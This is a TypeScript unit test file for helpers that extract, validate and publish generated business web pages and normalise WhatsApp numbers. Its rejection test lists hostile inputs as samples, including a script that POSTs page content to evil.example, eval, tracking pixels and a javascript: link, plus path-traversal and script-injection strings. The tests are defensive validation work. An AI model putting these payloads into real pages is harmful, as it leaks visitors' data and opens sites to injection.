import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { checkSiteHtml, extractSiteHtml, siteSlug, siteTitle } from './site.ts';

const page = (body: string, head = '') => `<!doctype html>\n<html lang="es"><head><meta charset="utf-8"><title>Galletas Rossi</title><style>body{margin:0}</style>${head}</head><body>${body}</body></html>`;

describe('site helpers', () => {
  it('extracts the first complete html document from a report', () => {
    const html = page('<p>hola</p>');
    const text = `# Informe\n\n\`\`\`html\n<div>fragmento</div>\n\`\`\`\n\n\`\`\`html\n${html}\n\`\`\`\n`;
    assert.equal(extractSiteHtml(text), html);
    assert.equal(extractSiteHtml('sin código'), null);
    assert.equal(extractSiteHtml(null), null);
  });

  it('accepts a self-contained page with inline script, styles and a WhatsApp link', () => {
    const ok = page('<a href="https://wa.me/391234567890?text=hola">Pedir</a><script>const total=[1,2].reduce((a,b)=>a+b);document.title=String(total);</script>');
    assert.deepEqual(checkSiteHtml(ok), []);
  });

  it('refuses anything that loads or sends data elsewhere, or runs dynamic code', () => {
    const bad = [
      page('<script src="https://cdn.example/x.js"></script>'),
      page('<script>fetch("https://evil.example",{method:"POST",body:document.body.innerHTML})</script>'),
      page('<script>navigator.sendBeacon("/x")</script>'),
      page('<script>eval("1+1")</script>'),
      page('<iframe src="https://x.example"></iframe>'),
      page('<img src="https://tracker.example/p.gif">'),
      page('', '<link rel="stylesheet" href="https://fonts.example/a.css">'),
      page('<style>@import url(https://x.example/a.css);</style>'),
      page('<style>body{background:url(https://x.example/a.png)}</style>'),
      page('<form action="https://x.example"></form>'),
      page('<script>document.cookie="a=1"</script>'),
      page('<a href="javascript:alert(1)">x</a>'),
      page('<meta http-equiv="refresh" content="0;url=https://x.example">'),
    ];
    for (const html of bad) assert.notDeepEqual(checkSiteHtml(html), [], html.slice(0, 80));
  });

  it('refuses a fragment and an oversized page', () => {
    assert.match(checkSiteHtml('<div>hola</div>')[0] ?? '', /HTML completo/);
    assert.ok(checkSiteHtml(page('x'.repeat(450_000))).some((p) => /pesa/.test(p)));
  });

  it('builds a url-safe slug with a unique suffix and reads the title', () => {
    assert.equal(siteTitle(page('')), 'Galletas Rossi');
    assert.equal(siteSlug('Galletas Rossi – Pedidos ¡Ya!', 'ABC-123-xyz'), 'galletas-rossi-pedidos-ya-abc123');
    assert.equal(siteSlug('', 'x'), 'sitio-x');
    assert.match(siteSlug('../../etc/passwd', 'a1'), /^[a-z0-9-]+$/);
  });
});

import { applyWhatsappNumber, whatsappDigits } from './site.ts';

describe('whatsapp number', () => {
  it('normalises international numbers and refuses junk', () => {
    assert.equal(whatsappDigits('+39 333 123 4567'), '393331234567');
    assert.equal(whatsappDigits('0039 333 1234567'), '393331234567');
    assert.equal(whatsappDigits('12'), null);
    assert.equal(whatsappDigits('"><script>'), null);
  });
  it('writes only digits into the constant, whatever quotes the page used', () => {
    const page = (q: string) => `<script>\n        const WHATSAPP_NUMBER = ${q}${q}; // nota\n</script>`;
    assert.match(applyWhatsappNumber(page('"'), '+39 333 1234567'), /const WHATSAPP_NUMBER = "393331234567"; \/\/ nota/);
    assert.match(applyWhatsappNumber(page("'"), '333 1234567'), /WHATSAPP_NUMBER = "3331234567"/);
    assert.equal(applyWhatsappNumber(page('"'), 'abc'), page('"'));
    assert.equal(applyWhatsappNumber('<p>sin constante</p>', '3331234567'), '<p>sin constante</p>');
  });
});
